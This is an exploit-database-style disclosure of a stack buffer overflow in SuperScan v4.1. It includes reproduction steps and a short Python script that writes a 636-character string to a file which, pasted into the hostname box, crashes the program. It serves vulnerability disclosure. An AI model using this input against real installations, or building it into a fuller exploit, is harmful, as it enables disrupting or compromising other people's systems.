# Exploit Title: SuperScan v4.1 - Stack Buffer Overflow (PoC)
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 18.09.2023
# Vendor: Foundstone Inc
# Software Link: https://delivery2.filecroco.com/kits_6/superscan-4.1.zip
# Tested Version: v4.1 (latest)
# Tested on: Windows 2019 Server 64bit

### Steps to Reproduce

1. Open the SuperScan application.
2. Paste the content of the `poc.txt` file into the “Hostname / IP” box.
3. Click the arrow right next to the box.
4. Application crashes, demonstrating the stack buffer overflow.

### Proof of Concept (PoC)

The following script generates a `poc.txt` file that, when loaded into SuperScan, triggers the buffer overflow.

```python
#!/usr/bin/python

poc = 'A' * 636

try:
    file = open("poc.txt", "w")
    file.write(poc)
    file.close()
    print("POC is created")
except Exception as e:
    print("POC is not created:", e)
